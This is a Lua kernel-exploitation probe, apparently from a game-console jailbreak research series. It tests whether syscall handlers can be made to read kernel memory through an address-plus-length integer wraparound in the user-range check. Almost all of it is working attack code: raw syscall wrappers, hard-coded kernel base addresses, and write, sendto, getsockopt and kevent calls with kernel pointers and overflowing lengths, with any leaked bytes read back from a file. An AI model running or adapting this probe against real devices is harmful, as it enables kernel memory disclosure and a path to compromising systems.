-- CRASH_CLASS: HIGH
-- PROBE 1426a: address+length wraparound against the user-range predicate
--
-- Every copyin/copyout wrapper in the 13.60 dump computes `udaddr + len`,
-- rejects on the carry (`jb`), then compares the SUM against 0x800000000000
-- (the canonical user boundary) before touching either side:
--   copyin  0xffffffff8ac19280: add rax,rdx / jb fail / cmp rax,0x800000000000 / ja fail
--   copyout 0xffffffff8ac191d0: identical at 0x8ac191f3 / 0x8ac191f6
-- A handler that performs its own range check instead of calling those helpers
-- would have the classic wrap: pass udaddr = kernel address and len = 2^64-udaddr
-- so the sum becomes 0 and the check passes while the copy still starts at the
-- kernel address. The wrap lengths here are exact and small because the kernel
-- image base is 2 MB aligned:
--   0xFFFFFFFFC1000000 + 0x3F000000 = 2^64   (sum 0)
--   0xFFFFFFFFC1000000 + 0x3F001000 = 2^64+0x1000
--   0xFFFFFFFFC0000000 + 0x40000000 = 2^64   (stub page, sum 0)
--
-- Measured prior art (all negatives, so this shape has never been run):
--   1342a results/phase35_dead_end_reruns/1342a_arg1_sweep_589_plus_20261109_101254.txt
--         K class: all 11 candidates reject a supervisor pointer (EFAULT/EINVAL/ESRCH)
--   1392a results/phase36_realargs/1392a_sys601_smuggle_20261109_141254.txt
--         user struct full of kernel addresses: no handler dereferences them
--   docs/ARG1_CLASSES_14_10.md, docs/ARG23_CLASSES_14_10.md
--
-- DISCRIMINATOR. write() is a copyin whose length we choose. If the predicate
-- wraps, the kernel copies kernel bytes into the socket buffer and the call
-- returns a byte count (then EWOULDBLOCK on the non-blocking socket) instead of
-- EFAULT. EFAULT = the predicate caught it, exactly as the static reading says.
-- Only copyin-source calls are used, so a bypass reads kernel memory; nothing
-- here asks the kernel to write to a kernel address.

print("=== PROBE 1426a: RANGE PREDICATE WRAP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return 0
end
local function wd(a, v)
    pcall(function() memory.write_dword(a, v) end)
end
local function hi(a) return math.floor(a / 4294967296) end
local function lo(a) return a % 4294967296 end
local function u64(a) return uint64(string.format("0x%08X%08X", hi(a), lo(a))) end

local mk = make_syscall
local KBASE = 0xFFFFFFFFC1000000   -- kernel image base, measured this boot
local KSTUB = 0xFFFFFFFFC0000000   -- 2 MB stub page, present

local function mmap_page(prot)
    local rv = -1
    local ok, r = pcall(function()
        return mk(477)(u64(0), u64(0x1000), u64(prot or 3), u64(0x1002), u64(0xFFFFFFFF), u64(0))
    end)
    if ok then rv = to_num(r) end
    if rv > 0x10000 and rv < 0x8000000000 then return rv end
    return nil
end

-- open() needs a NUL-terminated path in mapped memory; a Lua string passed to
-- uint64() raises "invalid decimal string" (/dev/dmem0), and memory.alloc is a
-- userdata so it cannot be passed to uint64() either -- build the path at a
-- numeric address we own.
local function str_at(addr, s)
    for i = 1, #s do
        pcall(function() memory.write_byte(addr + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(addr + #s, 0) end)
    return addr
end
local function open_file(path, flags)
    local pb = mmap_page(3)
    if not pb then return nil end
    str_at(pb, path)
    local rv = -1
    local ok, r = pcall(function()
        return mk(5)(u64(pb), u64(flags or 0x202), u64(0x1FF), u64(0), u64(0), u64(0))
    end)
    if ok then rv = to_num(r) end
    if rv >= 0 then return rv end
    return nil
end

-- F_SETFL(4) with O_NONBLOCK 0x4000 (platform value; 0x4 is wrong here)
local function nonblock(fd)
    pcall(function() mk(92)(u64(fd), u64(4), u64(0x4000), u64(0), u64(0), u64(0)) end)
end
local function newsock()
    local fdp = memory.alloc(8)
    wd(fdp, 0)
    wd(fdp + 4, 0)
    local rv = -1
    pcall(function() rv = to_num(mk(135)(u64(1), u64(1), u64(0), u64(to_num(fdp)), u64(0), u64(0))) end)
    if rv ~= 0 then return nil, nil end
    local a, b = rd(fdp), rd(fdp + 4)
    if a <= 0 or b <= 0 then return nil, nil end
    nonblock(a)
    nonblock(b)
    return a, b
end

local a, b = newsock()
if not a then
    print("[!] socketpair failed: " .. es())
    print("=== PROBE 1426a INCOMPLETE ===")
    return
end
print(string.format("[0] socketpair fds %d / %d (non-blocking)", a, b))

local userpage = mmap_page(3)
if userpage then
    for i = 0, 0xFC, 4 do wd(userpage + i, 0x41414141) end
    print(string.format("    control page 0x%X filled 0x41414141", userpage))
else
    print("    [!] control page mmap failed: " .. es())
end

-- write() to a FILE, not a socket: a bypassed predicate makes the kernel copy
-- until it hits an unmapped page (92 MB from the image base), and a socket
-- buffer would reject or block long before that. A file takes the bytes.
local filefd = open_file("/system_tmp/rw1", 0x202)
if filefd then
    print(string.format("    write target: /system_tmp/rw1 fd %d", filefd))
else
    print("    [!] /system_tmp/rw1 open failed: " .. es() .. " -- falling back to /app0/rw1")
    filefd = open_file("/app0/rw1", 0x202)
    if filefd then print(string.format("    write target: /app0/rw1 fd %d", filefd)) end
end

local function wcall(ptr, len)
    local rv = -999
    if not filefd then
        local ok, r = pcall(function()
            return mk(133)(u64(a), u64(ptr), u64(len), u64(0x80), u64(0), u64(0))
        end)
        if ok then rv = to_num(r) end
        return rv
    end
    pcall(function() mk(478)(u64(filefd), u64(0), u64(0), u64(0), u64(0), u64(0)) end)
    local ok, r = pcall(function()
        return mk(4)(u64(filefd), u64(ptr), u64(len), u64(0), u64(0), u64(0))
    end)
    if ok then rv = to_num(r) end
    return rv
end

local function read_back(n)
    if not filefd then return end
    local b2 = mmap_page(3)
    if not b2 then return end
    local rv = -1
    local ok, r = pcall(function()
        return mk(475)(u64(filefd), u64(b2), u64(n), u64(0), u64(0), u64(0))
    end)
    if ok then rv = to_num(r) end
    if rv > 0 then
        local out = {}
        for i = 0, math.min(rv, 48) - 4, 4 do
            out[#out + 1] = string.format("%08X", rd(b2 + i))
        end
        print(string.format("      file first %d bytes: %s", math.min(rv, 48), table.concat(out, " ")))
    end
end


-- ---------------------------------------------------------------- block A
print("[A] write(fd, ptr, len) with overflowing lengths")
local cases = {
    { "control user len 0x40",   userpage, 0x40 },
    { "control kernel len 0x40", KBASE,    0x40 },
    { "wrap base sum 0",         KBASE,    0x3F000000 },
    { "wrap base sum 0x1000",    KBASE,    0x3F001000 },
    { "wrap stub sum 0",         KSTUB,    0x40000000 },
}
for _, c in ipairs(cases) do
    local ptr, len = c[2], c[3]
    if ptr then
        local rv = wcall(ptr, len)
        print(string.format("    %-24s ptr=0x%-14X len=0x%-9X rv=%-6d errno=%s",
            c[1], ptr, len, rv, es()))
        if rv >= 0 then
            print(string.format("      >>> LANDED rv=%d bytes copied out of the kernel", rv))
            read_back(0x40)
        end
    end
end

-- ---------------------------------------------------------------- block B
print("[B] sendto(fd, ptr, len, flags, dst, dstlen) - second copyin shape")
for _, c in ipairs({ { "user 0x40", userpage, 0x40 }, { "kernel 0x40", KBASE, 0x40 },
                     { "wrap sum 0", KBASE, 0x3F000000 } }) do
    if c[2] then
        local rv = -999
        local ok, r = pcall(function()
            return mk(133)(u64(a), u64(c[2]), u64(c[3]), u64(0x80), u64(0), u64(0))
        end)
        if ok then rv = to_num(r) end
        print(string.format("    %-14s ptr=0x%-14X len=0x%-9X rv=%-6d errno=%s",
            c[1], c[2], c[3], rv, es()))
    end
end

-- ---------------------------------------------------------------- block C
print("[C] getsockopt destination sweep (SOL_SOCKET 0xFFFF / SO_TYPE 0x1008)")
local sz = memory.alloc(8)
for _, ptr in ipairs({ userpage or 0, KBASE, KSTUB }) do
    if ptr ~= 0 then
        wd(sz, 0x40)
        local rv = -999
        local ok, r = pcall(function()
            return mk(118)(u64(a), u64(0xFFFF), u64(0x1008), u64(ptr), u64(to_num(sz)), u64(0))
        end)
        if ok then rv = to_num(r) end
        print(string.format("    valptr 0x%-14X rv=%-6d errno=%s", ptr, rv, es()))
    end
end

-- ---------------------------------------------------------------- block D
print("[D] kevent with a kernel changelist (length computed kernel-side)")
local kq = -1
do
    local ok, r = pcall(function() return mk(362)(u64(0), u64(0), u64(0), u64(0), u64(0), u64(0)) end)
    if ok then kq = to_num(r) end
end
if kq and kq > 0 then
    for _, m in ipairs({ { "n=4", 4 }, { "n=0x400", 0x400 }, { "n=0x4000000", 0x4000000 } }) do
        local rv = -999
        local ok, r = pcall(function()
            return mk(363)(u64(kq), u64(KBASE), u64(m[2]), u64(0), u64(0), u64(0))
        end)
        if ok then rv = to_num(r) end
        print(string.format("    changelist kernel base %-12s rv=%-6d errno=%s", m[1], rv, es()))
    end
else
    print("    kqueue() failed: " .. es())
end

-- ---------------------------------------------------------------- verdict
print("[E] reading")
print("    rv=-1 errno=14 on every wrap row = the carry check fires; no other")
print("    shape explains a refusal for lengths that overflow 2^64.")
print("    A rv>=0 or an errno other than 14 on a wrap row means the handler")
print("    carries its own check and the copy started at a kernel address.")
print("    kernel image base used: 0xFFFFFFFFC1000000 (measured this boot)")
print("")
print("=== PROBE 1426a COMPLETE ===")
